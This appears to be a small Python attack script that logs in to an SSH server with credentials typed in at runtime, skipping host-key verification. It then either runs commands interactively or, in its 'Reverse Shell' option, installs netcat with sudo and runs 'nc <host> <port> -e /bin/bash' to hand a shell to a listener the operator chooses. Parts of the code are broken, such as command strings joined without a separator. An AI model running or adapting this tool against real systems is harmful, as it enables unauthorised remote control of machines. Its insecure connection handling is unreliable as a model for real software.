import paramiko
import threading   


host = input('Enter host: ')
user = input('Enter username: ')
passwd = input('Enter password: ')

c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #Conecta em conexões SSH sem verificar a chave do host
c.connect(host, username= user, password= passwd) #Passa os parâmetros para a conexão SSH



def exe_terminal(host=host):
    urhost = input("Enter your host: ")
    print("Connected to the SSH server. You can now execute commands...\n")
    choose = input ("Choose one: [1] - Free Texting [2] - Reverse Shell: ")
    if choose == "2":
        port = input("Enter the Port: ")
        urhost = input("Enter your host: ")
        cmd = ("sudo apt update && sudo apt install netcat-traditional -y" + f"nc {urhost} {port} -e /bin/bash") #Comando para instalar o netcat-traditional e criar a conexão reversa
        stdin, stdout, stderr = c.exec_command(cmd)
        while True:
            print(stdout.read().decode())
            err = stderr.read().decode()
            if err:
                print(f"Error {err}")
            print("Starting reverse shell...")           #No seu terminal nc -lvp e a porta que você escolheu para receber a conexão reversa    #arrumar aqui
            stdin, stdout, stderr = c.exec_command(input(f"Host {host}$~ Your command on host: "))
            output = stdout.readline()
            if output:
                print(output.strip())

            error = stderr.readline()
            if error:
                print(f"Erro: {error.strip()}")

            # Sai quando o comando terminou e não há mais nada para ler
            if stdout.channel.exit_status_ready() and not output and not error:
                break
        c.close()
    elif choose == "1":
        print("You can now execute commands on the remote server. Type 'exit' to disconnect.\n")  
        while True:
            command = input(f"{host}$~ Your command on host: ")
            if command.lower() == 'exit':
                print("Disconnecting from the SSH server...")
                c.close()
                break
            stdin, stdout, stderr = c.exec_command(command)
            output = stdout.read().decode()
            error = stderr.read().decode()
            if output:
                print(output.strip())
            if error:
                print(f"Error: {error.strip()}")
        stdin, stdout, stderr = c.exec_command(input(f"You're listening on {host}: "))


if __name__ == "__main__":
    exe_terminal()